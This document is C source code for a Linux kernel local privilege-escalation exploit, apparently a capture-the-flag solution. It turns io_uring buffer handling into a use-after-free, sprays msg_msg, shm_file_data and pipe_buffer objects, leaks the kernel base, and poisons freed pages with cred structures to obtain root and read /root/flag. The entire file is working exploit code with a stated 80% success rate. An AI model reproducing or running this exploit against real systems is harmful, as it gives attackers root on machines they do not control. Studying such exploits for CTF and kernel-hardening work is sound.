#include "exploit.h"  // https://github.com/smallkirby/lysithea/blob/master/assets/exploit.h

/**
 * Success Rate: 80% ~
 */

#include <liburing.h>
#include <linux/capability.h>
#include <linux/io_uring.h>
#include <sys/capability.h>

#define QUEUE_ENTS 1024

struct io_uring ring;

#define IOBUF_NUM1 0x109
#define IOBUF_BGID1 0xDEAD
#define IOBUF_BID_START1 0x0
char iobuf1[PAGE][IOBUF_NUM1] = {0};
#define IOBUF_NUM2 0x110
#define IOBUF_BGID2 0xBEEF
#define IOBUF_BID_START2 IOBUF_NUM1
char iobuf2[PAGE][IOBUF_NUM2] = {0};

struct state {
  int page_split;
  int cred_spray_num;
  int cred_uaf;
  int pwned;
};

struct state *state;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

struct state *init_state(void) {
  int shm_id = shmget(IPC_PRIVATE, PAGE, 0666 | IPC_CREAT);
  if (shm_id < 0) {
    errExit("shmget");
  }

  return (struct state *)shmat(shm_id, NULL, 0);
}

#define MSGMSG_CB_SIZE \
  0x30  // size of `struct msg_msg` without user-supplied data
struct msgbuf20alpha {
  long mtype;
  char mtext[(DATALEN_MSG + MSGMSG_CB_SIZE) + 0x20 -
             8];  // -8 is for msg_msgseg of second segment
};

char *any_buf;

void pinning_thread(int core) {
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(core, &mask);

  if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
    errExit("pthread_setaffinity_np");
  }
}

void *setcap_worker(void *arg) {
  struct __user_cap_header_struct cap_header = {
      .version = _LINUX_CAPABILITY_VERSION_1,
      .pid = gettid(),
  };
  struct __user_cap_data_struct cap_data;

  pinning_thread(0);

  if (capget(&cap_header, &cap_data) < 0) {
    errExit("capget");
  }

  cap_data.effective = 0x0;
  cap_data.permitted = 0x0;
  cap_data.inheritable = 0x0;

  while (state->page_split == 0) {
    usleep(1000);
  }

  pthread_mutex_lock(&lock);
  // puts("[+] Spraying cred structs in even pages...");
  pinning_thread(0);
  if (capset(&cap_header, &cap_data) < 0) {
    errExit("capset");
  }
  ++state->cred_spray_num;
  pthread_mutex_unlock(&lock);

  while (state->pwned == 0) {
    if (geteuid() == 0 || getuid() == 0) {
      // if (geteuid() == 0) {
      puts("\n[!] PWNED!!!!!!!!!!!!!!!!!\n");
      state->pwned = 1;
      printf("[+] WHOAMI: uid=%d euid=%d\n", getuid(), geteuid());
      puts("[+] forking...");
      if (!fork()) {
        setuid(0);
        int fd = open("/root/flag", O_RDONLY);
        char buf[0x100] = {0};
        read(fd, buf, sizeof(buf));
        write(1, "[!] flag: ", 9);
        write(1, buf, 80);
        write(1, "\n", 1);
        sleep(999999);
      } else {
        sleep(99999);
      }
    }

    usleep(1000);
  }

  sleep(500);
  return NULL;
}

void *su_worker(void *arg) {
  while (state->cred_uaf == 0) {
    usleep(1000);
  }

  // puts("[+] Spraying root cred...");
  pinning_thread(0);
  system("/bin/su");

  sleep(99999);

  return NULL;
}

int main(int argc, char *argv[]) {
  puts("[+] Start of life...");
  struct io_uring_params params = {0};
  struct io_uring_sqe *sqe = NULL;
  struct io_uring_cqe *cqe = NULL;
  int stat_fd = open("/proc/self/stat", O_RDONLY);

  puts("[+] Setting up io_uring...");
  if (io_uring_queue_init(QUEUE_ENTS, &ring, 0) < 0) {
    errExit("io_uring_queue_init");
  }

  puts("[+] Pinning process and io_uring worker thread to CPU 0...");
  cpu_set_t mask = {0};
  CPU_ZERO(&mask);
  CPU_SET(0, &mask);
  sched_setaffinity(0, sizeof(mask), &mask);
  if (io_uring_register_iowq_aff(&ring, sizeof(cpu_set_t), &mask) < 0) {
    errExit("io_uring_register_iowq_aff");
  }

  puts("[+] Spraying kmalloc-32 with `io_buffer` ...");
  sqe = io_uring_get_sqe(&ring);
  io_uring_prep_provide_buffers(sqe, iobuf1, PAGE, IOBUF_NUM1, IOBUF_BGID1,
                                IOBUF_BID_START1);
  io_uring_submit(&ring);
  io_uring_wait_cqe(&ring, &cqe);
  if (cqe->res < 0) errExit("io_uring_prep_provide_buffers");
  io_uring_cqe_seen(&ring, cqe);

  puts("[+] Spraying msg_msg with size 0x20...");
  struct msgbuf20alpha clean_msg20alpha = {.mtype = 1};
  memset(&clean_msg20alpha.mtext, 'A', sizeof(clean_msg20alpha.mtext));
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  KMALLOC(qid, clean_msg20alpha, 1);

  puts("[+] Freeing last io_buffer...");
  sqe = io_uring_get_sqe(&ring);
  io_uring_prep_read(sqe, stat_fd, iobuf1[0], 0x20, 0);
  io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
  sqe->buf_group = IOBUF_BGID1;
  io_uring_submit(&ring);
  io_uring_wait_cqe(&ring, &cqe);
  if (cqe->res < 0) errExit("io_uring_prep_read");
  io_uring_cqe_seen(&ring, cqe);

  /**
   *  Note that victim structure's first 8byte must be 0,
   * otherwise, msgrcv() would dereference that word as `struct msg_msgseg *`
   */
  puts("[+] Spraying shm_file_data...");
  {
    int shmid = shmget(IPC_PRIVATE, 0x1000, 0666 | IPC_CREAT);
    void *addr = shmat(shmid, NULL, 0);
    assert(addr != (void *)-1);
  }

  puts("[+] Leaking UAF-ed msg_msg...");
  ssize_t n_rcv =
      msgrcv(qid, &clean_msg20alpha, sizeof(clean_msg20alpha) - MSGMSG_CB_SIZE,
             clean_msg20alpha.mtype, MSG_NOERROR);
  printf("[!] 0x%lx bytes received\n", n_rcv);
  ulong *leaked = (ulong *)&clean_msg20alpha.mtext[DATALEN_MSG];
  ulong init_ipc_ns = leaked[0];
  ulong shmem_vm_ops = leaked[2];
  const ulong kbase = init_ipc_ns - 0xEB0D60;
  const ulong kdiff = kbase - 0xffffffff81000000;
  printf("[!] init_ipc_ns: 0x%lx\n", init_ipc_ns);
  printf("[!] leaked[1]: 0x%lx\n", leaked[1]);
  printf("[!] leaked[2]: 0x%lx\n", leaked[2]);
  printf("[!] kbase: 0x%lx\n", kbase);

  puts("------- Start Prepare for XCACHE poisoning -------");

  state = init_state();
  any_buf = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

#define SPRAY_SETCAP_NUM 0x50
  puts("[+] Creating setcap threads...");
  pthread_t setcap_pids[SPRAY_SETCAP_NUM];
  for (int ix = 0; ix < SPRAY_SETCAP_NUM; ix++) {
    pthread_create(&setcap_pids[ix], NULL, setcap_worker, NULL);
  }
#define SPRAY_SU_NUM 0x5
  puts("[+] Creating su threads...");
  pthread_t su_pids[SPRAY_SU_NUM];
  for (int ix = 0; ix < SPRAY_SU_NUM; ix++) {
    pthread_create(&su_pids[ix], NULL, su_worker, NULL);
  }
  usleep(1000);

  pinning_thread(0);

#define SPRAY_PIPE_NUM 0x60
  puts("[+] Spraying pipe_buffer...");
  int pipefds[SPRAY_PIPE_NUM][2];
  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
    if (pipe(pipefds[ix]) < 0) {
      errExit("pipe");
    }
  }

  usleep(5000);

  pinning_thread(0);
  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
    write(pipefds[ix][1], any_buf, 1);
  }

  pinning_thread(0);
  puts("[+] Closing even pages...");
  for (int ix = 0; ix < SPRAY_PIPE_NUM; ix += 2) {
    close(pipefds[ix][0]);
    close(pipefds[ix][1]);
  }
  state->page_split = 1;

  while (state->cred_spray_num < SPRAY_SETCAP_NUM) {
    usleep(1000);
  }
  pinning_thread(0);
  memset(any_buf, 'A', PAGE);
  puts("[+] Closing odd pipes...");
  for (int ix = 1; ix < SPRAY_PIPE_NUM; ix += 2) {
    close(pipefds[ix][0]);
    close(pipefds[ix][1]);
  }

  puts("[+] Allocating io_buffer in odd pages...");
  sqe = io_uring_get_sqe(&ring);
  io_uring_prep_provide_buffers(sqe, iobuf2, PAGE, IOBUF_NUM2, IOBUF_BGID2,
                                IOBUF_BID_START2);
  io_uring_submit(&ring);
  io_uring_wait_cqe(&ring, &cqe);
  if (cqe->res < 0) errExit("io_uring_prep_provide_buffers");
  io_uring_cqe_seen(&ring, cqe);

  for (int ix = 0; ix != 0x20; ++ix) {
    open("/proc/self/stat", O_RDONLY);
  }

  for (int ix = 0; ix != PAGE / 0x20; ++ix) {
    pinning_thread(0);

    // feed
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, iobuf2, PAGE, 1, IOBUF_BGID2,
                                  IOBUF_BID_START2 + IOBUF_NUM2 + ix);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    if (cqe->res < 0) errExit("io_uring_prep_provide_buffers");
    io_uring_cqe_seen(&ring, cqe);

    int seq_fd = open("/proc/self/stat", O_RDONLY);

    // consume
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, seq_fd, NULL, 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = IOBUF_BGID2;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    if (cqe->res != 0x20) errExit("io_uring_prep_read");
    io_uring_cqe_seen(&ring, cqe);
  }
  state->cred_uaf = 1;

  puts("[+] End of life...");
  sleep(1000);
}
